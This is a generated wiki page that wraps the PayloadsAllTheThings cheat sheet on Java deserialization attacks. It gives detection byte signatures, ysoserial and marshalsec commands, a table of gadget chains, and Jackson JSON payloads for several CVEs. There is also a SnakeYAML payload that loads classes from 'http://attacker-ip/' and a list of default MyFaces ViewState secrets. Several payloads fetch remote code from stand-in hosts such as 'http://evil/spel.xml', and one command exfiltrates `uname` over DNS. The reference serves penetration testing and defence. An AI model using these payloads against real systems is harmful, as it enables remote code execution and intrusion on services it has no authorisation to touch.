---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Java Deserialization

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-insecure-deserialization-java` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/Java.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Java Deserialization](../../topics/insecure-deserialization/java-deserialization.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-insecure-deserialization-java |
| name | Java Deserialization |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md |

## Preserved Source Material

````yaml
_body: "# Java Deserialization\n\n> Java serialization is the process of converting a Java object’s state into a byte stream,\
  \ which can be stored or transmitted and later reconstructed (deserialized) back into the original object. Serialization\
  \ in Java is primarily done using the `Serializable` interface, which marks a class as serializable, allowing it to be saved\
  \ to files, sent over a network, or transferred between JVMs.\n\n## Summary\n\n* [Detection](#detection)\n* [Tools](#tools)\n\
  \    * [Ysoserial](#ysoserial)\n    * [Burp extensions using ysoserial](#burp-extensions)\n    * [Alternative Tooling](#alternative-tooling)\n\
  * [YAML Deserialization](#yaml-deserialization)\n* [ViewState](#viewstate)\n* [References](#references)\n\n## Detection\n\
  \n* `\"AC ED 00 05\"` in Hex\n    * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.\n    * `00 05`:\
  \ STREAM_VERSION. The serialization version.\n* `\"rO0\"` in Base64\n* `Content-Type` = \"application/x-java-serialized-object\"\
  \n* `\"H4sIAAAAAAAAAJ\"` in gzip(base64)\n\n## Tools\n\n### Ysoserial\n\n[frohoff/ysoserial](https://github.com/frohoff/ysoserial)\
  \ : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.\n\n```java\njava -jar\
  \ ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin\njava -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin\n\
  java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin\njava -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]'\
  \ | gzip | base64\n```\n\n**List of payloads included in ysoserial:**\n\n| Payload             | Authors               \
  \                 | Dependencies |\n| ------------------- | -------------------------------------- | --- |\n| AspectJWeaver\
  \       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2 |\n| BeanShell1      \
  \    | @pwntester, @cschneider4711            | bsh:2.0b5 |\n| C3P0                | @mbechler                         \
  \     | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |\n| Click1              | @artsploit                             | click-nodeps:2.3.0,\
  \ javax.servlet-api:3.1.0 |\n| Clojure             | @JackOfMostTrades                      | clojure:1.8.0 |\n| CommonsBeanutils1\
  \   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |\n\
  | CommonsCollections1 | @frohoff                               | commons-collections:3.1 |\n| CommonsCollections2 | @frohoff\
  \                               | commons-collections4:4.0 |\n| CommonsCollections3 | @frohoff                         \
  \      | commons-collections:3.1 |\n| CommonsCollections4 | @frohoff                               | commons-collections4:4.0\
  \ |\n| CommonsCollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1  |\n| CommonsCollections6\
  \ | @matthias_kaiser                       | commons-collections:3.1  |\n| CommonsCollections7 | @scristalli, @hanyrax,\
  \ @EdoardoVignati | commons-collections:3.1  |\n| FileUpload1         | @mbechler                              | commons-fileupload:1.3.1,\
  \ commons-io:2.4|\n| Groovy1             | @frohoff                               | groovy:2.3.9            |\n| Hibernate1\
  \          | @mbechler                              | |\n| Hibernate2          | @mbechler                             \
  \ | |\n| JBossInterceptors1  | @matthias_kaiser                       | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final,\
  \ cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |\n| JRMPClient      \
  \    | @mbechler                              | |\n| JRMPListener        | @mbechler                              | |\n\
  | JSON1               | @mbechler                              | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0,\
  \ commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1\
  \ |\n| JavassistWeld1      | @matthias_kaiser                       | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1,\
  \ javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |\n| Jdk7u21             | @frohoff   \
  \                            | |\n| Jython1             | @pwntester, @cschneider4711            | jython-standalone:2.5.2\
  \ |\n| MozillaRhino1       | @matthias_kaiser                       | js:1.7R2 |\n| MozillaRhino2       | @_tint0      \
  \                          | js:1.7R2 |\n| Myfaces1            | @mbechler                              | |\n| Myfaces2\
  \            | @mbechler                              | |\n| ROME                | @mbechler                           \
  \   | rome:1.0 |\n| Spring1             | @frohoff                               | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE\
  \ |\n| Spring2             | @mbechler                              | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE,\
  \ aopalliance:1.0, commons-logging:1.2 |\n| URLDNS              | @gebl                                  | |\n| Vaadin1\
  \             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14 |\n| Wicket1       \
  \      | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4 |\n\n### Burp extensions\n\n* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)\
  \ -  Burp extension to perform Java Deserialization Attacks\n* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)\
  \ -  All-in-one plugin for Burp Suite for the detection and the exploitation of Java deserialization vulnerabilities\n*\
  \ [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) -  YSOSERIAL Integration with Burp Suite\n* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial)\
  \ - Burp Java Deserialization Vulnerability Identification\n* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active)\
  \ - Java Deserialization Vulnerability Active Identification Burp Extender\n\n### Alternative Tooling\n\n* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)\
  \ - Pure JRE 8 RCE Deserialization gadget\n* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others\
  \ Java Deserialization Vulnerabilities) verify and EXploitation Tool\n* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified)\
  \ - A fork of the original ysoserial application\n* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) -\
  \ Java serialization brute force attack tool\n* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper)\
  \ - A tool to dump Java serialization streams in a more human readable form\n* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe)\
  \ - Exploiting Deserialization to Brute-Force the Remote Classpath\n* [k3idii/Deserek](https://github.com/k3idii/Deserek)\
  \ - Python code to Serialize and Unserialize java binary serialization format.\n\n  ```java\n  java -jar ysoserial.jar URLDNS\
  \ http://xx.yy > yss_base.bin\n  python deserek.py yss_base.bin --format python > yss_url.py\n  python yss_url.py yss_new.bin\n\
  \  java -cp JavaSerializationTestSuite DeSerial yss_new.bin\n  ```\n\n* [mbechler/marshalsec](https://github.com/mbechler/marshalsec)\
  \ - Java Unmarshaller Security - Turning your data into code execution\n\n  ```java\n  $ java -cp marshalsec.jar marshalsec.<Marshaller>\
  \ [-a] [-v] [-t] [<gadget_type> [<arguments...>]]\n  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy \"cmd\" \"/c\" \"\
  calc\"\n  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\\#exploit.JNDIExploit 1389\n  //\
  \ -a - generates/tests all payloads for that marshaller\n  // -t - runs in test mode, unmarshalling the generated payloads\
  \ after generating them.\n  // -v - verbose mode, e.g. also shows the generated payload in test mode.\n  // gadget_type\
  \ - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.\n  // arguments\
  \ - Gadget specific arguments\n  ```\n\nPayload generators for the following marshallers are included:\n\n| Marshaller \
  \                     | Gadget Impact                                |\n| ------------------------------- | ----------------------------------------------\
  \ |\n| BlazeDSAMF(0&#124;3&#124;X)     | JDK only escalation to Java serialization various third party libraries RCEs |\n\
  | Hessian&#124;Burlap             | various third party RCEs |\n| Castor                          | dependency library RCE\
  \ |\n| Jackson                         | **possible JDK only RCE**, various third party RCEs |\n| Java                 \
  \           | yet another third party RCE |\n| JsonIO                          | **JDK only RCE** |\n| JYAML           \
  \                | **JDK only RCE** |\n| Kryo                            | third party RCEs |\n| KryoAltStrategy       \
  \          | **JDK only RCE** |\n| Red5AMF(0&#124;3)               | **JDK only RCE** |\n| SnakeYAML                   \
  \    | **JDK only RCEs** |\n| XStream                         | **JDK only RCEs** |\n| YAMLBeans                       |\
  \ third party RCE |\n\n## JSON Deserialization\n\nMultiple libraries can be used to handle JSON in Java.\n\n* [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)\n\
  * [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)\n* [Fastjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#fastjson-json)\n\
  * [Genson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)\n* [Flexjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#flexjson-json)\n\
  * [Jodd](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jodd-json)\n\n**Jackson**:\n\nJackson is a popular\
  \ Java library used for working with JSON (JavaScript Object Notation) data.\nJackson-databind supports Polymorphic Type\
  \ Handling (PTH), formerly known as \"Polymorphic Deserialization\", which is disabled by default.\n\nTo determine if the\
  \ backend is using Jackson, the most common technique is to send an invalid JSON and inspect the error message. Look for\
  \ references to either of those:\n\n```java\nValidation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException:\
  \ Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for\
  \ class java.lang.Object\n```\n\n* com.fasterxml.jackson.databind\n* org.codehaus.jackson.map\n\n**Exploitation**:\n\n*\
  \ **CVE-2017-7525**\n\n  ```json\n  {\n    \"param\": [\n      \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"\
  ,\n      {\n        \"transletBytecodes\": [\n          \"yv66v[JAVA_CLASS_B64_ENCODED]AIAEw==\"\n        ],\n        \"\
  transletName\": \"a.b\",\n        \"outputProperties\": {}\n      }\n    ]\n  }\n    ```\n\n* **CVE-2017-17485**\n\n  ```json\n\
  \  {\n    \"param\": [\n      \"org.springframework.context.support.FileSystemXmlApplicationContext\",\n      \"http://evil/spel.xml\"\
  \n    ]\n  }\n  ```\n\n* **CVE-2019-12384**\n\n  ```json\n  [\n    \"ch.qos.logback.core.db.DriverManagerConnectionSource\"\
  , \n    {\n      \"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"\
  \n    }\n  ]\n  ```\n\n* **CVE-2020-36180**\n\n  ```json\n  [\n    \"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\"\
  ,\n    {\n      \"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'\"\n    }\n\
  \  ]\n  ```\n\n* **CVE-2020-9548**\n\n    ```json\n    [\n      \"br.com.anteros.dbcp.AnterosDBCPConfig\",\n      {\n  \
  \      \"healthCheckRegistry\": \"ldap://{{interactsh-url}}\"\n      }\n    ]\n    ```\n\n## YAML Deserialization\n\n* [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)\n\
  * [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)\n* [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)\n\
  \n**SnakeYAML**:\n\nSnakeYAML is a popular Java-based library used for parsing and emitting YAML (YAML Ain't Markup Language)\
  \ data. It provides an easy-to-use API for working with YAML, a human-readable data serialization standard commonly used\
  \ for configuration files and data exchange.\n\n```yaml\n!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader\
  \ [[\n    !!java.net.URL [\"http://attacker-ip/\"]\n  ]]\n]\n```\n\n## ViewState\n\nIn Java, ViewState refers to the mechanism\
  \ used by frameworks like JavaServer Faces (JSF) to maintain the state of UI components between HTTP requests in web applications.\
  \ There are 2 major implementations:\n\n* Oracle Mojarra (JSF reference implementation)\n* Apache MyFaces\n\n**Tools**:\n\
  \n* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Jboss (and Java Deserialization Vulnerabilities)\
  \ verify and EXploitation Tool\n* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace\
  \ is a software used to patch unencrypted and unsigned JSF ViewStates.\n\n### Encoding\n\n| Encoding      | Starts with\
  \ |\n| ------------- | ----------- |\n| base64        | `rO0`       |\n| base64 + gzip | `H4sIAAA`   |\n\n### Storage\n\n\
  The `javax.faces.STATE_SAVING_METHOD` is a configuration parameter in JavaServer Faces (JSF). It specifies how the framework\
  \ should save the state of a component tree (the structure and data of UI components on a page) between HTTP requests.\n\
  \nThe storage method can also be inferred from the viewstate representation in the HTML body.\n\n* **Server side** storage:\
  \ `value=\"-XXX:-XXXX\"`\n* **Client side** storage: `base64 + gzip + Java Object`\n\n### Encryption\n\nBy default MyFaces\
  \ uses DES as encryption algorithm and HMAC-SHA1 to authenticate the ViewState. It is possible and recommended to configure\
  \ more recent algorithms like AES and HMAC-SHA256.\n\n| Encryption Algorithm | HMAC        |\n| -------------------- | -----------\
  \ |\n| DES ECB (default)    | HMAC-SHA1   |\n\nSupported encryption methods are BlowFish, 3DES, AES and are defined by a\
  \ context parameter.\nThe value of these parameters and their secrets can be found inside these XML clauses.\n\n```xml\n\
  <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   \n<param-name>org.apache.myfaces.SECRET</param-name>   \n<param-name>org.apache.myfaces.MAC_SECRET</param-name>\n\
  ```\n\nCommon secrets from the [documentation](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application).\n\
  \n| Name                 | Value                              |\n| -------------------- | ----------------------------------\
  \ |\n| AES CBC/PKCS5Padding | `NzY1NDMyMTA3NjU0MzIxMA==`         |\n| DES                  | `NzY1NDMyMTA=<`           \
  \         |\n| DESede               | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |\n| Blowfish             | `NzY1NDMyMTA3NjU0MzIxMA`\
  \           |\n| AES CBC              | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |\n| AES CBC IV           | `NzY1NDMyMTA3NjU0MzIxMA==`\
  \         |\n\n* **Encryption**: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState\n* **Decryption**:\
  \ ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data\n\n## References\n\n* [Detecting deserialization\
  \ bugs with DNS exfiltration - Philippe Arteau - March 22, 2017](https://web.archive.org/web/20230927142712/https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)\n\
  * [Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill - October 4, 2017](https://web.archive.org/web/20260303123815/https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)\n\
  * [Hack The Box - Arkham - 0xRick - August 10, 2019](https://web.archive.org/web/20251125134359/https://0xrick.github.io/hack-the-box/arkham/)\n\
  * [How I found a $1500 worth Deserialization vulnerability - Ashish Kunwar - August 28, 2018](https://web.archive.org/web/20250918030712/https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)\n\
  * [Jackson CVE-2019-12384: anatomy of a vulnerability class - Andrea Brancaleoni - July 22, 2019](https://web.archive.org/web/20190724143322/https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)\n\
  * [Jackson gadgets - Anatomy of a vulnerability - Andrea Brancaleoni - July 22, 2019](https://web.archive.org/web/20190724143322/https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)\n\
  * [Jackson Polymorphic Deserialization - FasterXML - July 23, 2020](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)\n\
  * [Java Deserialization Cheat Sheet - Aleksei Tiurin - May 23, 2023](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)\n\
  * [Java Deserialization in ViewState - Haboob Team - December 23, 2020](https://web.archive.org/web/20250909154616/https://www.exploit-db.com/docs/48126)\n\
  * [JSF ViewState upside-down - Renaud Dubourguais, Nicolas Collignon - March 15, 2016](https://web.archive.org/web/20160315020109/http://synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)\n\
  * [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://web.archive.org/web/20181217131654/https://alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)\n\
  * [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://web.archive.org/web/20201207032909/https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n\
  * [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin (@artsploit) - June 29, 2021](https://web.archive.org/web/20260210022416/https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)\n\
  * [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com - July 5, 2020](https://web.archive.org/web/20250604040229/https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)\n\
  * [Understanding & practicing java deserialization exploits - Diablohorn - September 9, 2017](https://web.archive.org/web/20250604034046/https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)\n\
  * [Friday the 13th JSON Attacks - Alvaro Muñoz & Oleksandr Mirosh - July 28, 2017](https://web.archive.org/web/20170728193005/https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)"
_relative_path: Insecure Deserialization/Java.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/Java.md
````
